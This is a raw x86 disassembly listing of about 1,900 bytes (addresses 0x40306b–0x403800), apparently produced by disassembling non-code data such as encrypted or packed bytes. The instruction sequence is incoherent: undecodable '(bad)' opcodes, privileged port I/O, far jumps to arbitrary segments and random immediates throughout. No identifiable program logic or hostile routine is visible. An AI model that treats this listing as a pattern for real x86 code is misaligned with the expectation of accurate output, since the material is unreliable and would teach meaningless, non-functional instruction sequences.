  40306b:	scas   al,BYTE PTR es:[edi]
  40306c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40306d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40306e:	outs   dx,BYTE PTR ds:[esi]
  40306f:	xchg   edi,eax
  403070:	(bad)
  403074:	mov    BYTE PTR ds:0xdf5c4ca8,ch
  40307a:	mov    ah,0xb8
  40307c:	cdq    
  40307d:	push   edi
  40307e:	mov    ecx,0x4dbb3f58
  403083:	pop    ds
  403084:	ret    
  403085:	hlt    
  403086:	out    0xa0,al
  403088:	and    esp,DWORD PTR ds:[eax+0x258756a8]
  40308f:	mov    dl,cl
  403091:	popa   
  403092:	inc    ebp
  403093:	mov    bh,0xbe
  403095:	sub    bh,dl
  403097:	fcmovnu st,st(7)
  403099:	mov    DWORD PTR [eax+0x26b649ea],ecx
  40309f:	(bad)  
  4030a0:	rcl    BYTE PTR [edi],0x5
  4030a3:	jmp    0xf9b1:0x54532cc6
  4030aa:	mov    al,0xec
  4030ac:	jbe    0x4030c4
  4030ae:	jle    0x403072
  4030b0:	lds    ebp,FWORD PTR [ebp-0x28]
  4030b3:	inc    ebp
  4030b4:	or     bl,BYTE PTR [ebp+0x58]
  4030b7:	xchg   esi,ecx
  4030b9:	loop   0x403134
  4030bb:	xchg   edi,eax
  4030bc:	mov    bl,0x3e
  4030be:	push   0xffffffef
  4030c0:	add    DWORD PTR [esp+ecx*2],edx
  4030c3:	sub    ebp,edi
  4030c5:	cmp    edi,DWORD PTR [esi+0x2b]
  4030c8:	or     edi,DWORD PTR [eax+0x26e7e2bb]
  4030ce:	retf   
  4030cf:	shl    DWORD PTR [ecx+eiz*4],cl
  4030d2:	xchg   ebx,eax
  4030d3:	fs ret 0xa741
  4030d7:	enter  0x8ce0,0x54
  4030db:	mov    ds:0x7a493527,al
  4030e0:	test   BYTE PTR [ebx-0x60f54ceb],bl
  4030e6:	cdq    
  4030e7:	xlat   BYTE PTR ds:[ebx]
  4030e8:	fnstcw WORD PTR [di+0x2d97]
  4030ed:	and    ecx,DWORD PTR [ecx+0x4e]
  4030f0:	inc    edx
  4030f1:	and    dh,BYTE PTR [ecx]
  4030f3:	clc    
  4030f4:	sbb    BYTE PTR [edi+ebx*8-0xd55115a],cl
  4030fb:	adc    esi,edi
  4030fd:	in     al,0xa
  4030ff:	cmp    bh,dl
  403101:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403102:	lds    eax,FWORD PTR [eax+0x7c]
  403105:	into   
  403106:	mov    bl,0x2e
  403108:	mov    edi,0x5fa3c64f
  40310d:	nop
  40310e:	pusha  
  40310f:	aad    0x7
  403111:	or     esp,esp
  403113:	sbb    BYTE PTR [edi+ebx*8],bh
  403116:	ins    DWORD PTR es:[edi],dx
  403117:	icebp  
  403118:	pop    ebp
  403119:	cld    
  40311a:	retf   0x7484
  40311d:	lods   al,BYTE PTR ds:[esi]
  40311e:	xchg   ebx,eax
  40311f:	cmp    BYTE PTR [esi-0x45],dh
  403122:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403123:	scas   eax,DWORD PTR es:[edi]
  403124:	cmp    ebx,DWORD PTR [ebx-0x2c]
  403127:	mov    cl,0xa8
  403129:	leave  
  40312a:	inc    edi
  40312b:	call   0x5075:0x3d8e85eb
  403132:	shl    BYTE PTR ds:0x55afa984,cl
  403138:	add    BYTE PTR [ebx],ah
  40313a:	sahf   
  40313b:	retf   0xde59
  40313e:	loopne 0x403165
  403140:	lahf   
  403141:	lock jo 0x4030f2
  403144:	pop    edx
  403145:	out    dx,al
  403146:	cld    
  403147:	sti    
  403148:	stc    
  403149:	loope  0x403186
  40314b:	aaa    
  40314c:	and    ecx,esi
  40314e:	ret    0xbbb1
  403151:	imul   eax,DWORD PTR [ebx],0x79ea5836
  403157:	and    edx,esp
  403159:	cmp    al,0x31
  40315b:	inc    esp
  40315c:	lock jge 0x4031da
  40315f:	iret   
  403160:	sbb    al,0xeb
  403162:	aas    
  403163:	pop    ds
  403164:	adc    bh,BYTE PTR [edx-0x7d]
  403167:	mov    ebp,DWORD PTR [edx-0x77]
  40316a:	push   cs
  40316b:	test   al,0x2f
  40316d:	adc    ah,BYTE PTR [esi]
  40316f:	push   0x3fe2971b
  403174:	or     BYTE PTR [edx+0x73ec1b57],0xb0
  40317b:	jmp    0x4031e5
  40317d:	or     eax,0xbd46595
  403182:	jecxz  0x40317c
  403184:	and    BYTE PTR [ebx+0x17597c5d],dh
  40318a:	jp     0x40312a
  40318c:	enter  0xff05,0x43
  403190:	pop    ecx
  403191:	aad    0x56
  403193:	cmp    al,0xca
  403195:	test   eax,0xb7213604
  40319a:	cmc    
  40319b:	mov    edi,0xc030ccab
  4031a0:	or     eax,0xdc8b66d7
  4031a5:	in     al,0xab
  4031a7:	inc    ecx
  4031a8:	into   
  4031a9:	inc    ebp
  4031aa:	cdq    
  4031ab:	(bad)  
  4031ac:	mov    edi,0x20fbe76a
  4031b1:	xchg   ebx,eax
  4031b2:	sbb    edx,DWORD PTR [edx]
  4031b4:	enter  0x14b8,0xff
  4031b8:	dec    esp
  4031b9:	fidivr WORD PTR [edx]
  4031bb:	stos   BYTE PTR es:[edi],al
  4031bc:	push   ss
  4031bd:	sbb    al,0xb4
  4031bf:	add    bl,BYTE PTR [edx]
  4031c1:	sub    DWORD PTR [edx],ebp
  4031c3:	cmp    dh,ch
  4031c5:	in     eax,0x94
  4031c7:	dec    edi
  4031c8:	std    
  4031c9:	imul   edi,DWORD PTR [bp+di],0xa4df072d
  4031d0:	iret   
  4031d1:	lods   al,BYTE PTR ds:[esi]
  4031d2:	jo     0x403217
  4031d4:	dec    ebx
  4031d5:	jb     0x403170
  4031d7:	mov    ebx,0x1bafee28
  4031dc:	sti    
  4031dd:	mov    ss,WORD PTR [esi]
  4031df:	push   cs
  4031e0:	stc    
  4031e1:	mov    DWORD PTR [edi+0xe],0xee1bfc31
  4031e8:	cld    
  4031e9:	fnstcw WORD PTR [eax]
  4031eb:	stos   DWORD PTR es:[edi],eax
  4031ec:	fisttp QWORD PTR [ebx-0x1f]
  4031ef:	leave  
  4031f0:	inc    edi
  4031f1:	mov    ebp,0x5331b17d
  4031f6:	mov    BYTE PTR [edx+0x3bf8518e],ch
  4031fc:	adc    BYTE PTR ds:0x45c2d3b7,cl
  403202:	cmp    bh,BYTE PTR [esi-0x4d25c529]
  403208:	inc    edi
  403209:	ret    
  40320a:	dec    eax
  40320b:	and    ebp,DWORD PTR [bx+di]
  40320e:	leave  
  40320f:	retf   0xb256
  403212:	call   0x2542:0xd388d3c1
  403219:	mov    esi,0x55534d50
  40321e:	xor    DWORD PTR [ebx+0x5a],ebx
  403221:	clc    
  403222:	inc    ebp
  403223:	mov    ds:0xfaf66344,al
  403228:	in     al,dx
  403229:	mov    cl,0x15
  40322b:	add    dh,BYTE PTR [ebx]
  40322d:	imul   ebp,DWORD PTR [edi+eax*1],0xffffffa9
  403231:	add    BYTE PTR [ebp-0x5b1f08a6],dh
  403237:	test   eax,0x7ad09de5
  40323c:	cwde   
  40323d:	dec    esi
  40323e:	jge    0x4031e5
  403240:	sbb    BYTE PTR [ebx-0x54dbbd77],bh
  403246:	push   0x4d
  403248:	leave  
  403249:	add    esi,ecx
  40324b:	cli    
  40324c:	inc    esp
  40324d:	inc    esi
  40324e:	mov    ebx,ecx
  403250:	push   edi
  403251:	mov    al,ds:0x79fb421c
  403256:	sub    al,0x24
  403258:	add    dl,BYTE PTR [ebp+0x1f]
  40325b:	imul   ebp,DWORD PTR [edx-0x664e50fb],0x9324afa1
  403265:	inc    ecx
  403266:	repnz adc edx,edi
  403269:	(bad)  
  40326a:	sbb    ecx,DWORD PTR ss:[eax+0x9]
  40326e:	dec    eax
  40326f:	std    
  403270:	pop    ds
  403271:	jb     0x403275
  403273:	rcl    DWORD PTR [esi-0x26e3aaa0],0x24
  40327a:	into   
  40327b:	jmp    0x403298
  40327d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40327e:	test   al,0xcc
  403280:	push   ebp
  403281:	sbb    ah,ch
  403283:	lods   eax,DWORD PTR ds:[esi]
  403284:	add    esi,edi
  403286:	pusha  
  403287:	shr    BYTE PTR [ecx],cl
  403289:	shl    DWORD PTR [eax-0x6bece695],0xdd
  403290:	gs pop edi
  403292:	jp     0x4032f0
  403294:	cli    
  403295:	lods   al,BYTE PTR ds:[esi]
  403296:	lahf   
  403297:	dec    esp
  403298:	pop    ds
  403299:	pop    esi
  40329a:	inc    edi
  40329b:	or     al,0xd0
  40329d:	loopne 0x40330a
  40329f:	sbb    ch,cl
  4032a1:	(bad)  
  4032a2:	into   
  4032a3:	push   ebx
  4032a4:	dec    esi
  4032a5:	lods   al,BYTE PTR ds:[esi]
  4032a6:	jl     0x403248
  4032a8:	ja     0x403282
  4032aa:	pop    edi
  4032ab:	and    cl,BYTE PTR [esi]
  4032ad:	push   0x6a
  4032af:	sbb    esp,DWORD PTR ds:0xbe9c80ca
  4032b5:	cmp    al,BYTE PTR [eax+0x346be452]
  4032bb:	repz jmp 0x40326c
  4032be:	test   DWORD PTR [esi+0x0],ebx
  4032c1:	inc    esi
  4032c2:	mov    es,WORD PTR [edi]
  4032c4:	fs xchg esp,eax
  4032c6:	cmp    DWORD PTR [ecx+0x19],eax
  4032c9:	mov    eax,0x66ad4948
  4032ce:	inc    ebx
  4032cf:	mov    cl,BYTE PTR cs:[ecx-0x7784361e]
  4032d6:	ins    DWORD PTR es:[edi],dx
  4032d7:	pop    edi
  4032d8:	xor    BYTE PTR [esi],bh
  4032da:	jne    0x4032f8
  4032dc:	inc    esp
  4032dd:	pop    esi
  4032de:	or     eax,DWORD PTR [edx-0x1c]
  4032e1:	dec    edx
  4032e2:	stc    
  4032e3:	ja     0x4032e8
  4032e5:	dec    eax
  4032e6:	sub    eax,0xd25ed1da
  4032eb:	or     cl,ah
  4032ed:	in     eax,dx
  4032ee:	daa    
  4032ef:	pop    ss
  4032f0:	lahf   
  4032f1:	and    ecx,DWORD PTR [edi]
  4032f3:	mov    ebp,0x995833ac
  4032f8:	xchg   DWORD PTR [ecx-0xa],edi
  4032fb:	dec    ebx
  4032fc:	(bad)  [edx+0x70]
  4032ff:	add    BYTE PTR [eax+0x35c27a26],bl
  403305:	imul   esp
  403307:	rol    BYTE PTR [edx],1
  403309:	aam    0xd7
  40330b:	jne    0x403333
  40330d:	and    DWORD PTR [ebp-0x1e9dae2d],esi
  403313:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403314:	mov    ebp,0xcbe059dd
  403319:	retf   0x4c19
  40331c:	dec    eax
  40331d:	jb     0x403345
  40331f:	push   ds
  403320:	mov    edx,0x1291720b
  403325:	inc    ebx
  403326:	add    ebx,DWORD PTR [ebp+0x7]
  403329:	hlt    
  40332a:	dec    ebp
  40332b:	mov    dh,0xc
  40332d:	cld    
  40332e:	push   eax
  40332f:	out    0x25,al
  403331:	in     al,0x31
  403333:	pop    es
  403334:	adc    ebx,0xdad19de1
  40333a:	jb     0x4032d8
  40333c:	mov    esi,0xc642a640
  403341:	ret    
  403342:	add    BYTE PTR [ecx],0x45
  403345:	fldcw  WORD PTR [edi+0x1a72aa93]
  40334b:	mov    edi,0x32bb7be9
  403350:	jp     0x403370
  403352:	mov    ecx,0x2577be17
  403357:	lods   al,BYTE PTR ds:[esi]
  403358:	sub    DWORD PTR [edi-0x7b],edx
  40335b:	arpl   bp,bp
  40335d:	ja     0x40332c
  40335f:	aaa    
  403360:	fistp  WORD PTR [ecx-0x53]
  403363:	push   edx
  403364:	nop
  403365:	jp     0x403318
  403367:	sbb    eax,DWORD PTR [ebx]
  403369:	adc    BYTE PTR [eax+ebp*2+0x37],cl
  40336d:	add    al,0x1
  40336f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403370:	adc    BYTE PTR [eax+ecx*2+0x53d81263],bl
  403377:	int    0x39
  403379:	jp     0x40334a
  40337b:	lods   al,BYTE PTR ds:[esi]
  40337c:	dec    edx
  40337d:	adc    al,0xf
  40337f:	fwait
  403380:	xor    al,0x20
  403382:	mov    bh,0x47
  403384:	int3   
  403385:	or     DWORD PTR [esp+ebx*8-0x69],0x9ccaedd1
  40338d:	mov    ecx,0xaa5967e5
  403392:	jp     0x403337
  403394:	data16 outs dx,BYTE PTR ds:[esi]
  403396:	push   ebx
  403397:	dec    esi
  403398:	pop    esi
  403399:	push   ebx
  40339a:	sqrtps xmm4,XMMWORD PTR [esi-0x3251a784]
  4033a1:	jae    0x403417
  4033a3:	jno    0x403348
  4033a5:	gs mov ah,0x35
  4033a8:	xchg   esp,eax
  4033a9:	jne    0x4033db
  4033ab:	adc    al,BYTE PTR [ecx-0x4f]
  4033ae:	inc    esp
  4033af:	ficom  WORD PTR [eax+ecx*4+0x4c262f1b]
  4033b6:	push   es
  4033b7:	scas   eax,DWORD PTR es:[edi]
  4033b8:	sub    dh,BYTE PTR [ebx]
  4033ba:	xor    ch,al
  4033bc:	mov    cl,0xdb
  4033be:	(bad)  
  4033bf:	mov    ch,0x58
  4033c1:	(bad)  
  4033c2:	mov    ch,0xc0
  4033c4:	xchg   ebx,eax
  4033c5:	lds    ecx,FWORD PTR [eax]
  4033c7:	mov    ds:0x5c966793,al
  4033cc:	into   
  4033cd:	and    DWORD PTR [eax+0x51e9818e],0x3e
  4033d4:	out    0xe9,al
  4033d6:	in     eax,0xb8
  4033d8:	add    DWORD PTR [ecx+0x74e16dae],ecx
  4033de:	test   ebp,esp
  4033e0:	sar    DWORD PTR [ebp+0x7711aa78],1
  4033e6:	jmp    0x1ea3:0xac74be37
  4033ed:	(bad)  
  4033ee:	add    eax,DWORD PTR [edi+eiz*1-0x9]
  4033f2:	dec    ebp
  4033f3:	pop    es
  4033f4:	mov    edx,DWORD PTR [esi]
  4033f6:	in     eax,dx
  4033f7:	xchg   ebp,eax
  4033f8:	movq   mm6,mm0
  4033fb:	test   DWORD PTR [edx-0x4f],edi
  4033fe:	adc    BYTE PTR [ebx-0x46269f97],dl
  403404:	fwait
  403405:	pop    esp
  403406:	push   0x4923625d
  40340b:	inc    eax
  40340c:	sub    DWORD PTR [ecx],eax
  40340e:	dec    edi
  40340f:	jmp    0xea0383ee
  403414:	in     al,0x6f
  403416:	cmp    DWORD PTR [ebp-0x2fd2b852],eax
  40341c:	enter  0x2996,0x67
  403420:	jnp    0x403464
  403422:	retf   0x4d3d
  403425:	push   cs
  403426:	fcmove st,st(7)
  403428:	and    al,0xe2
  40342a:	inc    eax
  40342b:	xchg   edx,eax
  40342c:	das    
  40342d:	lods   al,BYTE PTR ds:[esi]
  40342e:	scas   al,BYTE PTR es:[edi]
  40342f:	mov    ah,0xca
  403431:	xchg   esi,eax
  403432:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403433:	dec    esi
  403434:	imul   edx,edx,0xfffffff5
  403437:	ret    0x3eb9
  40343a:	xor    al,0x86
  40343c:	repz loope 0x4033f2
  40343f:	ins    DWORD PTR es:[edi],dx
  403440:	mov    BYTE PTR [ebp+0x6dfc64f2],ah
  403446:	ret    
  403447:	imul   edi,DWORD PTR [ebp-0x1dfe1251],0xb680655b
  403451:	push   DWORD PTR [edx]
  403453:	push   es
  403454:	clc    
  403455:	or     ch,al
  403457:	cmp    al,0x6d
  403459:	pop    edi
  40345a:	push   DWORD PTR [eax-0x5a]
  40345d:	inc    eax
  40345e:	dec    ecx
  40345f:	pop    ds
  403460:	and    BYTE PTR [edx+0x2e],al
  403463:	mov    eax,0x4ffa1840
  403468:	(bad)  
  403469:	mov    eax,0xa7688b27
  40346e:	stc    
  40346f:	outs   dx,BYTE PTR ds:[esi]
  403470:	and    DWORD PTR [edi+0x1b],ebx
  403473:	inc    ecx
  403474:	aad    0xb8
  403476:	dec    edx
  403477:	lahf   
  403478:	sub    DWORD PTR [edx+0x3b7c2318],ecx
  40347e:	loop   0x4034ab
  403480:	mov    esp,0x53ed27a
  403485:	cs aaa 
  403487:	shr    DWORD PTR [edi-0x3b3348fb],cl
  40348d:	loope  0x4034bf
  40348f:	fcom   DWORD PTR ss:[esi]
  403492:	test   BYTE PTR [eax-0x22],0x48
  403496:	lahf   
  403497:	xchg   DWORD PTR [ebx+0x21726fc5],esp
  40349d:	dec    edi
  40349e:	dec    esp
  40349f:	nop
  4034a0:	loopne 0x40349a
  4034a2:	sub    ebx,DWORD PTR [ebp+0x443c3578]
  4034a8:	adc    ecx,DWORD PTR [edi-0xe]
  4034ab:	(bad)  
  4034ad:	cmovne ebp,DWORD PTR [edi]
  4034b0:	test   al,0x3c
  4034b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034b3:	xchg   edi,eax
  4034b4:	fidivr DWORD PTR [edx]
  4034b6:	adc    ebp,esp
  4034b8:	ret    
  4034b9:	adc    al,0x12
  4034bb:	add    BYTE PTR [eax],ah
  4034bd:	cmp    DWORD PTR [esi],0x29
  4034c0:	or     bh,BYTE PTR [edx]
  4034c2:	mov    ah,0x4d
  4034c4:	push   es
  4034c5:	int3   
  4034c6:	int    0xa
  4034c8:	adc    al,BYTE PTR [ebx-0x1c]
  4034cb:	pushf  
  4034cc:	rcr    BYTE PTR [ecx],cl
  4034ce:	add    cl,BYTE PTR [ecx-0xf]
  4034d1:	(bad)  
  4034d3:	mov    cl,0x68
  4034d5:	mov    edi,0xdd7a3e47
  4034da:	pop    edx
  4034db:	rcl    DWORD PTR [esi-0x38],1
  4034de:	shl    BYTE PTR [eax+0x5c26bbca],0x77
  4034e5:	je     0x4034f3
  4034e7:	push   edi
  4034e8:	cmp    ebp,esi
  4034ea:	mov    bl,0x2f
  4034ec:	mov    eax,0xcfe0b6b2
  4034f1:	loope  0x4034a9
  4034f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034f4:	mov    ds:0x4921bc5e,eax
  4034f9:	jmp    0x403579
  4034fb:	test   eax,0x58e042e1
  403500:	push   edx
  403501:	jns    0x40351f
  403503:	mov    ecx,0xc29b5219
  403508:	ds aam 0xcc
  40350b:	das    
  40350c:	ds mov bl,bl
  40350f:	in     al,dx
  403510:	dec    eax
  403511:	outs   dx,DWORD PTR ds:[esi]
  403512:	jns    0x40354f
  403514:	and    al,0xed
  403516:	daa    
  403517:	and    BYTE PTR [ecx-0x74],ch
  40351a:	repz std 
  40351c:	pop    ds
  40351d:	inc    esi
  40351e:	data16 das 
  403520:	mov    ch,0xf2
  403522:	leave  
  403523:	mov    ebx,edx
  403525:	inc    esi
  403526:	cld    
  403527:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403528:	lock outs dx,BYTE PTR ds:[esi]
  40352a:	cmp    dh,ah
  40352c:	and    edx,DWORD PTR [ecx+0x16530de3]
  403532:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403533:	ins    BYTE PTR es:[edi],dx
  403534:	jle    0x40357c
  403536:	add    esi,DWORD PTR [ebp-0x435b7b53]
  40353c:	popf   
  40353d:	outs   dx,BYTE PTR ds:[esi]
  40353e:	sbb    ch,ch
  403540:	xchg   ecx,eax
  403541:	shl    DWORD PTR [edx+0x6feb1b3],0xf9
  403548:	mov    ah,0xce
  40354a:	add    ch,BYTE PTR [ebp-0x7fa822a9]
  403550:	pop    ecx
  403551:	adc    BYTE PTR [edx+0x12],0x94
  403555:	pop    es
  403556:	jns    0x403559
  403558:	(bad)
  40355b:	repnz mov ecx,0xb54ce14a
  403561:	(bad)  
  403562:	mov    edi,0xcb06257a
  403567:	shl    BYTE PTR [edx-0x4b],cl
  40356a:	shl    DWORD PTR [ebx-0x62],1
  40356d:	loop   0x4034f7
  40356f:	push   cs
  403570:	dec    ebx
  403571:	aaa    
  403572:	dec    ebp
  403573:	daa    
  403574:	test   bl,cl
  403576:	test   BYTE PTR [ebp-0x29],ch
  403579:	ret    
  40357a:	lock and eax,0x5
  40357e:	dec    esp
  40357f:	jne    0x403539
  403581:	cdq    
  403582:	fbstp  TBYTE PTR [ebx-0x5a48712a]
  403588:	ds iret 
  40358a:	in     eax,0x28
  40358c:	xor    al,0x1
  40358e:	cld    
  40358f:	(bad)  
  403590:	enter  0x467b,0x1f
  403594:	inc    ebp
  403595:	fsubr  DWORD PTR [edx+eax*8]
  403598:	cli    
  403599:	outs   dx,BYTE PTR ds:[esi]
  40359a:	in     al,dx
  40359b:	inc    ebx
  40359c:	imul   edx,DWORD PTR [ebx],0x2fa5b41d
  4035a2:	xlat   BYTE PTR ds:[ebx]
  4035a3:	jmp    0x40352d
  4035a5:	jne    0x403549
  4035a7:	pop    ebx
  4035a8:	fcom   DWORD PTR [ebx]
  4035aa:	inc    eax
  4035ab:	jp     0x403537
  4035ad:	stos   DWORD PTR es:[edi],eax
  4035ae:	xchg   ebp,esi
  4035b0:	and    eax,0xf9b953ac
  4035b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035b6:	sbb    BYTE PTR [edx+ebx*2-0x356658e7],cl
  4035bd:	les    esp,FWORD PTR [ebp+0x18]
  4035c0:	pop    eax
  4035c1:	xor    BYTE PTR [edx],0x5b
  4035c4:	daa    
  4035c5:	adc    al,0x8
  4035c7:	jecxz  0x403629
  4035c9:	imul   edx,edx,0x32d358a7
  4035cf:	out    0x92,al
  4035d1:	lock in al,dx
  4035d3:	jae    0x403579
  4035d5:	adc    DWORD PTR [edi+0x15],ecx
  4035d8:	scas   eax,DWORD PTR es:[edi]
  4035d9:	stc    
  4035da:	not    esi
  4035dc:	(bad)  
  4035de:	pop    edi
  4035df:	pop    ecx
  4035e0:	push   es
  4035e1:	push   ebx
  4035e2:	pop    ds
  4035e3:	sbb    eax,0x64a718c9
  4035e8:	or     eax,0xc15eed43
  4035ed:	lods   al,BYTE PTR ds:[esi]
  4035ee:	pop    esp
  4035ef:	add    ecx,DWORD PTR [ecx-0xe]
  4035f2:	xor    al,0xdd
  4035f4:	js     0x403576
  4035f6:	int    0x7b
  4035f8:	pop    esp
  4035f9:	add    esp,edx
  4035fb:	push   ds
  4035fc:	mov    al,0xfc
  4035fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035ff:	test   BYTE PTR [edx+0x79],ah
  403602:	idiv   BYTE PTR [edi-0x6e9931a0]
  403608:	stos   BYTE PTR es:[edi],al
  403609:	add    ebx,DWORD PTR ss:[ecx+0x55]
  40360d:	mov    cl,0x53
  40360f:	inc    ecx
  403610:	or     eax,ebp
  403612:	sbb    ecx,DWORD PTR [edi-0x27]
  403615:	lahf   
  403616:	bound  edi,QWORD PTR [edi-0x3c]
  403619:	mov    ah,0x22
  40361b:	ja     0x40364c
  40361d:	mov    ch,0xc0
  40361f:	rol    DWORD PTR [ecx],0xbe
  403622:	pop    esp
  403623:	xor    al,0xb9
  403625:	mov    esp,0x2007d4a6
  40362a:	sbb    eax,0x16b35616
  40362f:	dec    edi
  403630:	retf   
  403631:	adc    DWORD PTR [esp+ecx*1-0x258db068],ebx
  403638:	lods   al,BYTE PTR ds:[esi]
  403639:	in     al,0xd3
  40363b:	jbe    0x403680
  40363d:	popa   
  40363e:	ss ja  0x403604
  403641:	pop    ebx
  403642:	mov    ds:0xae75610f,eax
  403647:	push   esi
  403648:	mov    ebp,0x2795fc9e
  40364d:	and    eax,0x370669e5
  403652:	xor    eax,0x71249bee
  403657:	sahf   
  403658:	jo     0x40365f
  40365a:	push   cs
  40365b:	imul   edx,DWORD PTR [edi+0x4],0xffffffca
  40365f:	pop    esi
  403660:	je     0x4036c7
  403662:	mov    edx,0xd16f01b8
  403667:	push   ebp
  403668:	cmp    ah,BYTE PTR [edi-0x4be590e0]
  40366e:	add    BYTE PTR [esi*2+0x787c8c95],bl
  403675:	jg     0x403676
  403677:	xchg   edi,eax
  403678:	arpl   WORD PTR [ebx-0x9c614c],sp
  40367e:	adc    al,0x1f
  403680:	retf   
  403681:	scas   al,BYTE PTR es:[edi]
  403682:	or     DWORD PTR [ebp-0x237b294e],eax
  403688:	not    bl
  40368a:	sub    bh,BYTE PTR [edx]
  40368c:	pop    ebp
  40368d:	mov    bl,0x16
  40368f:	lea    esi,[eax+0x1aca4894]
  403695:	mov    BYTE PTR [edx+0xe],0x54
  403699:	mov    dl,0x48
  40369b:	jbe    0x403685
  40369d:	xchg   esp,eax
  40369e:	sbb    ch,ah
  4036a0:	cli    
  4036a1:	pop    ebx
  4036a2:	mov    ecx,0x7589d72b
  4036a7:	push   edx
  4036a8:	inc    edx
  4036a9:	jbe    0x4036be
  4036ab:	mov    ah,0x2f
  4036ad:	pop    ebx
  4036ae:	mov    dh,0x70
  4036b0:	mov    ch,0xdc
  4036b2:	icebp  
  4036b3:	mov    ds:0xa2ed34de,eax
  4036b8:	mov    fs,WORD PTR [edi]
  4036ba:	shr    DWORD PTR [ebx-0x12],cl
  4036bd:	sbb    BYTE PTR [eax],al
  4036bf:	iret   
  4036c0:	sbb    eax,0x2d38a07e
  4036c5:	jno    0x403679
  4036c7:	enter  0x3991,0x5c
  4036cb:	mov    WORD PTR [ecx+esi*4-0x228e72de],cs
  4036d2:	or     DWORD PTR [ecx+eax*2+0x75],edx
  4036d6:	dec    eax
  4036d7:	loop   0x4036be
  4036d9:	pop    eax
  4036da:	fisubr WORD PTR [edx+0x575a5a62]
  4036e0:	jecxz  0x403690
  4036e2:	add    ah,dh
  4036e4:	inc    esi
  4036e5:	add    DWORD PTR [ebp-0x23],ebx
  4036e8:	pop    eax
  4036e9:	mov    eax,0x8f14f87
  4036ee:	loope  0x403752
  4036f0:	xchg   ecx,eax
  4036f1:	imul   esi,DWORD PTR [edx],0x7fe598eb
  4036f7:	aad    0xe5
  4036f9:	mov    al,0x47
  4036fb:	ret    0x1266
  4036fe:	fucomp st(1)
  403700:	dec    esi
  403701:	or     eax,DWORD PTR [ebx-0x3613d341]
  403707:	mov    dl,0xb5
  403709:	in     al,0xf1
  40370b:	idiv   DWORD PTR [esi+0x28]
  40370e:	xchg   esp,eax
  40370f:	ret    
  403710:	mov    ss,ecx
  403712:	loop   0x4036b8
  403714:	bound  ecx,QWORD PTR [ebx]
  403716:	lods   al,BYTE PTR ds:[esi]
  403717:	inc    ebp
  403718:	ins    BYTE PTR es:[edi],dx
  403719:	push   cs
  40371a:	inc    edi
  40371b:	loopne 0x4036a7
  40371d:	(bad)  
  40371e:	lahf   
  40371f:	rol    ebp,cl
  403721:	shl    ecx,1
  403723:	push   ebx
  403724:	not    esp
  403726:	xchg   esp,eax
  403727:	das    
  403728:	sar    BYTE PTR [ecx-0x344315b1],0xf2
  40372f:	int3   
  403730:	and    eax,0xc6d0625e
  403735:	adc    BYTE PTR [edx*4-0x39c770e0],0x2c
  40373d:	js     0x40372d
  40373f:	jg     0x4036c4
  403741:	adc    eax,0xefcd79f8
  403746:	cmp    DWORD PTR [ebp+edx*8-0xc],edx
  40374a:	xchg   ebx,eax
  40374b:	stos   BYTE PTR es:[edi],al
  40374c:	clc    
  40374d:	inc    edi
  40374e:	pop    es
  40374f:	fsub   DWORD PTR [edi-0x49]
  403752:	out    0x2f,al
  403754:	mov    ds,WORD PTR [ebx-0x75]
  403757:	(bad)  
  403758:	stc    
  403759:	shl    BYTE PTR [edi+0x45bdeb18],0x69
  403760:	mov    ecx,0x9a8a601d
  403765:	test   eax,0xcb3b01bd
  40376a:	cli    
  40376b:	iret   
  40376c:	adc    BYTE PTR [edi-0x2e],dh
  40376f:	stos   DWORD PTR es:[edi],eax
  403770:	jl     0x40378b
  403772:	dec    esi
  403773:	ins    DWORD PTR es:[edi],dx
  403774:	sub    eax,0x2dc7fb3b
  403779:	ins    DWORD PTR es:[edi],dx
  40377a:	int    0xc4
  40377c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40377d:	mov    DWORD PTR [ebp-0x401bfa45],esi
  403783:	ja     0x4037a9
  403785:	jle    0x403725
  403787:	fnstenv [eax]
  403789:	adc    cl,BYTE PTR [eax+0x49]
  40378c:	cld    
  40378d:	dec    esp
  40378e:	daa    
  40378f:	test   BYTE PTR [eax],0x87
  403792:	mov    esp,0x78b8debc
  403797:	(bad)
  40379a:	sbb    ecx,DWORD PTR [esi]
  40379c:	btc    DWORD PTR [esi+0x5546f027],ebx
  4037a3:	push   ecx
  4037a4:	retf   
  4037a5:	(bad)  [edx-0x75]
  4037a8:	daa    
  4037a9:	sbb    al,0x7f
  4037ab:	xchg   ebp,eax
  4037ac:	mov    edx,0x73dafd70
  4037b1:	jns    0x40379d
  4037b3:	mov    al,ds:0xdf2fbc37
  4037b8:	inc    ecx
  4037b9:	retf   
  4037ba:	sbb    BYTE PTR [ebx],0xbb
  4037bd:	pop    esp
  4037be:	xchg   ebp,eax
  4037bf:	je     0x4037f1
  4037c1:	test   BYTE PTR [ecx+0x3c],bh
  4037c4:	sbb    dl,BYTE PTR [eax+0x31]
  4037c7:	add    BYTE PTR [ebp+0x2a],cl
  4037ca:	inc    eax
  4037cb:	jg     0x4037bd
  4037cd:	in     al,0xf3
  4037cf:	call   0xbf306fb0
  4037d4:	pop    ds
  4037d5:	(bad)  
  4037d7:	shl    ecx,cl
  4037d9:	call   0x30a9:0x11dc557c
  4037e0:	cmc    
  4037e1:	dec    ebp
  4037e2:	xchg   ecx,eax
  4037e3:	sub    esi,edx
  4037e5:	div    DWORD PTR [ecx-0x58]
  4037e8:	lds    edi,FWORD PTR [ebp+edx*8-0x17132c5d]
  4037ef:	outs   dx,DWORD PTR ds:[esi]
  4037f0:	jbe    0x4037f3
  4037f2:	add    BYTE PTR [ebp+0x2b840fc0],al
  4037f8:	add    BYTE PTR [eax],al
  4037fa:	add    BYTE PTR [ebp-0x8f7b],cl
  403800:	call   DWORD PTR [eax-0x75]
